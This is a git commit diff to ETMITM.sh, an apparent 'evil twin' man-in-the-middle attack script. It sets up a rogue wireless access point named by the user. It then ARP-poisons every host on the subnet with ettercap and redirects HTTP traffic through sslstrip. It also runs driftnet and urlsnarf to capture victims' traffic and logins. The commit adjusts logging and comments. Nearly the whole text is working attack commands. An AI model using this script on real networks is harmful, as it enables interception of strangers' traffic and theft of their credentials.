0792556cda70bcc0833a172ec630de6cd93dd68f
Reid Baker <hamiltonbaker@yahoo.com>
2011-12-08 02:58:20 -0500

    removed unnessary tools and added documentation for the airbase command

--- ETMITM.sh
+++ ETMITM.sh
@@ -54,7 +54,10 @@ echo "Creating Symbolic Link"
 ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
 
 echo "Creating Access Point with name $essid on channel 1"
-gnome-terminal --geometry=78x9+0+350 -x sh -c "airbase-ng -c 1 -e \"$essid\" mon0" &
+# airbase-ng flags 
+## -c sets the channel the AP is running on
+## --essid <ESSID> : specify a single ESSID
+gnome-terminal --geometry=78x9+0+350 -x sh -c "airbase-ng -c 1 --essid \"$essid\" mon0" &
 sleep 2
 
 ifconfig at0 up
@@ -68,21 +71,19 @@ echo "Start DNS Masq"
 
 echo "Launching ettercap, poisoning all hosts on the at0 interface's subnet"
 #gnome-terminal -x sh -c  "ettercap -T -q -p -l ettercap$(date +%F-%H%M).log -i at0" &
-gnome-terminal --geometry=78x16 -x  sh -c "ettercap -Tzqu -i at0" &
+gnome-terminal --geometry=78x16 -x  sh -c "ettercap -Tzqu -l ettercap.log -i at0" &
 sleep 4
 
-# Ensure IP forwarding is enabled
-#echo 'Configuring ip forwarding'
-#echo "1" > /proc/sys/net/ipv4/ip_forward
+echo 'Configuring ip forwarding'
 
 iptables --table nat --append PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
 iptables --table nat --append POSTROUTING --out-interface $iface -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 
+# Ensure IP forwarding is enabled
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo 'Launching various tools'
 driftnet -v -i at0 &
 gnome-terminal --geometry=121x10+0+600 -x  sh -c "urlsnarf -i at0" &
-gnome-terminal --geometry=31x4-1-1 -x  sh -c "dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log"
 gnome-terminal --geometry=31x4-1-190 -x  sh -c "sslstrip -a -k -f" &
